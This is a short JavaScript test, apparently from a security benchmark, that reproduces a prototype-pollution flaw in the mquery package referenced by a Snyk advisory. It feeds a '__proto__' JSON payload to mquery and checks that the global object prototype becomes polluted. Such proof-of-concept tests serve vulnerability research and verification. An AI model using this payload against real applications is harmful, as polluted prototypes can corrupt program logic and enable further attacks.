//https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
test("prototype pollution in mquery", () => {
  const mquery = require("mquery");
  let obj = {};
  var payload = JSON.parse(process.env.SECBENCH_PAYLOAD || process.env.SECBENCH_PAYLOAD || '{"__proto__": {"polluted": "yes"}}');

  expect({}.polluted).toBe(undefined);

  var m = mquery(payload);
  expect({}.polluted).toBe("yes");
});
